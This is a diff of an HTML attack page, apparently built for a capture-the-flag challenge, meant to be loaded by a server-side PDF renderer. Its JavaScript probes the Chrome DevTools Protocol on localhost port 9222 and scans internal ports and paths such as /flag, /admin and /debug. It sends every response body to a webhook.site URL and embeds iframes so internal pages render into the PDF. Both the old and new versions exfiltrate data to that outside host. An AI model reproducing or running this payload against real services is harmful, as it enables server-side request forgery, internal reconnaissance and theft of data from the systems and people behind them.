@@ -1,36 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Internal Network Scanner</title>
+    <title>Advanced Scanner</title>
+    <style>
+        iframe { width: 100%; height: 250px; border: 2px solid red; margin-bottom: 10px; }
+    </style>
 </head>
 <body>
-    <h1>Archival Review in Progress...</h1>
-    <div id="output" style="word-break: break-all; font-family: monospace;"></div>
+    <h2>Internal Extraction in Progress...</h2>
+    <div id="log"></div>
 
     <script>
-        // Common ports where internal apps/APIs run in CTFs
-        const ports = [3000, 5000, 8080, 80, 443, 31326, 1337, 8000];
-        // Common sensitive paths
-        const paths = ['', '/flag', '/flag.txt', '/admin', '/api', '/debug', '/config', '/status'];
+        const webhook = 'https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427';
+
+        // 1. Check for Chrome DevTools Protocol (CDP) on port 9222
+        fetch('http://127.0.0.1:9222/json/version')
+            .then(res => res.json())
+            .then(data => {
+                fetch(webhook + '?cdp_version=' + encodeURIComponent(JSON.stringify(data)));
+            }).catch(e => {});
+
+        fetch('http://127.0.0.1:9222/json/list')
+            .then(res => res.json())
+            .then(data => {
+                fetch(webhook + '?cdp_list=' + encodeURIComponent(JSON.stringify(data)));
+            }).catch(e => {});
+
+        // 2. Scan common ports and paths
+        const ports = [3000, 5000, 8080, 80, 9222, 1337, 31326];
+        const paths = ['', '/flag', '/flag.txt', '/admin', '/api', '/debug'];
 
         ports.forEach(port => {
             paths.forEach(path => {
                 const target = `http://127.0.0.1:${port}${path}`;
                 
+                // Try fetching data
                 fetch(target)
-                    .then(response => response.text())
-                    .then(data => {
-                        if (data && data.length > 0) {
-                            // 1. Exfiltrate to your Webhook
-                            fetch('https://webhook.site/00b9d887-8f02-4299-a8a5-4675ed7b5427?target=' + encodeURIComponent(target) + '&data=' + encodeURIComponent(data));
-                            
-                            // 2. Render onto the page so it appears in the downloaded PDF
-                            document.getElementById('output').innerHTML += `<br>[FOUND] ${target}: <br>${data.replace(/</g, "&lt;")} <hr>`;
+                    .then(r => r.text())
+                    .then(text => {
+                        if (text && text.length > 0) {
+                            fetch(webhook + '?found=' + encodeURIComponent(target) + '&body=' + encodeURIComponent(text.substring(0, 400)));
                         }
-                    })
-                    .catch(error => {
-                        // Silently ignore closed ports/connection failures
-                    });
+                    }).catch(err => {});
+
+                // Embed iframes for direct PDF rendering of main targets
+                if (path === '' || path === '/flag' || path === '/flag.txt') {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = target;
+                    document.body.appendChild(iframe);
+                }
             });
         });
     </script>
